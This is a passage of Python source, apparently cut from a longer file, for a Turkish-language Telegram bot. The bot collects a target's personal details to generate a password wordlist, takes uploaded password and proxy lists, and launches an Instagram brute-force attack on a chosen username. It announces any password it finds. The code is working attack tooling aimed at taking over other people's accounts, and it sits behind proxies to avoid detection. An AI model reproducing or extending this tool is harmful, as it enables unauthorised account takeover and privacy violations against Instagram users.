        elif query.data == 'randnum_yes':
            self.user_data[user_id]['password_profile']['randnum'] = True
            await self.generate_password_file(query, user_id)
        elif query.data == 'randnum_no':
            self.user_data[user_id]['password_profile']['randnum'] = False
            await self.generate_password_file(query, user_id)
        elif query.data == 'start_attack':
            await self.start_attack(update, context)
        elif query.data == 'skip_lastname':
            self.user_data[user_id]['password_profile']['lastname'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_birthdate'
        elif query.data == 'skip_birthdate':
            self.user_data[user_id]['password_profile']['birthdate'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_pet'
        elif query.data == 'skip_pet':
            self.user_data[user_id]['password_profile']['pet'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_company'
        elif query.data == 'skip_company':
            self.user_data[user_id]['password_profile']['company'] = ''
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_keywords'
        elif query.data == 'skip_keywords':
            self.user_data[user_id]['password_profile']['keywords'] = []
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_leet'
        else:
            await query.message.reply_text("❌ Geçersiz işlem! Lütfen /start ile yeniden başla.")

    async def generate_password_file(self, query: Update, user_id: int):
        profile = self.user_data[user_id]['password_profile']
        wordlist = self.password_generator.generate_wordlist(profile)
        file_path = f"passwords_{user_id}.txt"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(wordlist))
        self.user_data[user_id]['password_file'] = file_path
        await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi.")
        await query.message.reply_document(document=InputFile(file_path, filename='generated_passwords.txt'))
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)

    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        query = update.callback_query

        await query.message.reply_text("🚀 Saldırı başladığında bildirileceksin, şu an gerekli kurulumlar yapılıyor...")

        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
            await query.message.reply_text("⚠️ Saldırı zaten devam ediyor!")
            return

        if not self.user_data[user_id]['username']:
            await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
            return
        if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
            return

        try:
            passwords = []
            encodings = ['utf-8', 'latin-1', 'iso-8859-9']
            for encoding in encodings:
                try:
                    with open(self.user_data[user_id]['password_file'], 'r', encoding=encoding, errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()]
                    break
                except UnicodeDecodeError:
                    continue

            if not passwords:
                await query.message.reply_text("❌ Şifre dosyası okunamadı! Geçerli bir dosya yükle.")
                return

            proxy_list = []
            if self.user_data[user_id]['proxy_file'] and os.path.exists(self.user_data[user_id]['proxy_file']):
                for encoding in encodings:
                    try:
                        with open(self.user_data[user_id]['proxy_file'], 'r', encoding=encoding, errors='ignore') as f:
                            proxy_list = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue

            core = InstagramBruteForce(proxy_list=proxy_list)

            async def progress_callback(message):
                await query.message.reply_text(message)

            task = asyncio.create_task(
                core.brute_force(
                    self.user_data[user_id]['username'],
                    passwords,
                    self.user_data[user_id]['timeout'],
                    progress_callback=progress_callback
                )
            )
            self.brute_force_tasks[user_id] = task
            result = await task
            if result:
                await query.message.reply_text(f"🎉 **BAŞARILI! Şifre bulundu: {result}**", parse_mode='Markdown')
            else:
                await query.message.reply_text(f"❌ İşlem tamamlandı, doğru şifre bulunamadı.", parse_mode='Markdown')

        except Exception as e:
            await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}", parse_mode='Markdown')
        finally:
            if user_id in self.brute_force_tasks:
                del self.brute_force_tasks[user_id]
            # Dosya temizliği
            for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
                if file_path and os.path.exists(file_path):
                    try:
                        os.remove(file_path)
                        await query.message.reply_text(f"🗑️ Dosya silindi: {file_path}")
                    except Exception as e:
                        logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")

async def main():
    bot = TelegramBot()
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.button))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
    await application.run_polling()

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
